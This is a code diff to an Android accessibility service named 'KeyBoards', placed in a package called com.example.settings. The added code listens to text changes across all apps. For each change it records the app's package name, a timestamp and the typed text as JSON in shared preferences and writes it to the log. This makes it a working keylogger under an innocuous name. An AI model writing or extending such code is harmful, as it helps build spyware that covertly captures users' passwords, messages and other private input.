@@ -9,6 +9,13 @@ import android.widget.Toast;
 
 import static com.example.settings.Utils.getDateTime;
 
+import androidx.room.util.StringUtil;
+
+import org.apache.commons.lang3.StringUtils;
+import org.json.JSONArray;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 public class KeyBoards extends AccessibilityService {
         Sharedpref mSharedpref;
         @Override
@@ -45,11 +52,33 @@ public class KeyBoards extends AccessibilityService {
                      break;*/
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                     String texts=mSharedpref.getSaveTextWritten();
+                    JSONObject mJsonObject;
+                  try {
+                      JSONArray mJsonArray;
+
+                      if (StringUtils.isBlank(texts)){
+                          mJsonArray= new JSONArray();                      }
+                      else {
+                          mJsonArray= new JSONArray(texts);
+                      }
+                      mJsonObject=new JSONObject();
+                      mJsonObject.put("package name",event.getPackageName());
+                      mJsonObject.put("date",getDateTime());
+                      mJsonObject.put("value",eventText+event.getText());
+                      mJsonArray.put(mJsonObject);
+                      mSharedpref.setSaveTextWritten(mJsonArray.toString());
+                      mSharedpref.commit();
+                      Log.d("json",mJsonObject.toString());
+                  }
+                  catch (Exception e){
+                    e.printStackTrace();
+                  }
+
                     System.out.println("SERVICE 1 : "+event.getPackageName() + "");
                     String newtext=texts+eventText + event.getText();
-                    mSharedpref.setSaveTextWritten(newtext);
-                    mSharedpref.commit();
+
                     //print the typed text in the console. Or do anything you want here.
+
                     System.out.println("ACCESSIBILITY SERVICE : "+eventText + "Sharedwala : "+texts);
                     break;
                 case  AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
@@ -95,10 +124,10 @@ public class KeyBoards extends AccessibilityService {
 
         @Override
         public void onServiceConnected() {
-            //Toast.makeText(getApplicationContext(),"Connected",Toast.LENGTH_SHORT).show();
+            Toast.makeText(getApplicationContext(),"Connected",Toast.LENGTH_SHORT).show();
             AccessibilityServiceInfo info = getServiceInfo();
             info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
-            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
+            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
             info.notificationTimeout = 100;
             info.flags=AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
             this.setServiceInfo(info);
